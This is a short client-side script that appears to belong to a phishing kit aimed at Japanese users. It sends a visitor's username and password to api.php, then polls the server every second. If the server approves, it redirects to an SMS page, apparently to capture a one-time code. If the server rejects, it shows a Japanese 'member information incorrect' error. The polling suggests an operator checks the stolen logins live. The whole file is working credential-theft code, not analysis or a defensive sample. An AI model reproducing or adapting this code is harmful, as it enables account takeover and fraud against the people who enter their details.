<script>
$(document).ready(function() {
    $('.icon-button-pass').click(function(){
        if($(this).prev().attr('type')=='password'){
            $(this).prev().attr('type', 'text');
        }else{
            $(this).prev().attr('type', 'password');
        }

    })
})
function tijiao(){
    var username = $("input[name='username']").val();
    var password = $("input[name='password']").val();
    var item = false;
    var id = 0;
    $.ajax({
        type:'post',
        url:'api.php',
        data:{username:username,password:password,action:'add'},
        async:false,
        success:function (res){
            var obj = JSON.parse(res);
            console.log(obj)
            if(obj.code === 200){
                //添加成功
                item = true;
                id = obj.data;
            }else{
                console.log(obj.msg);
            }
        }
    })
    if(item === true){
		$("#zhezhao").css('display','block');
        var interval = setInterval(function(){
            $.ajax({
                type:'post',
                url:'api.php',
                data:{id:id,action:'check_start1'},
                async:false,
                success:function (res){
                    var obj = JSON.parse(res);
                    console.log(obj)
                    if(obj.code === 200){
                        if(obj.data.is_start1 == 1){
                            window.location.href = './sms.php?id='+id;
                        }else if(obj.data.is_start1 == -1){
							clearInterval(interval);
							alert('メンバー情報が間違っています。もう一度お試しください');
							$("#zhezhao").css('display','none');
						}
                    }else{
                        console.log(obj.msg);
                    }
                }
            })
        }, 1000)
    }

}
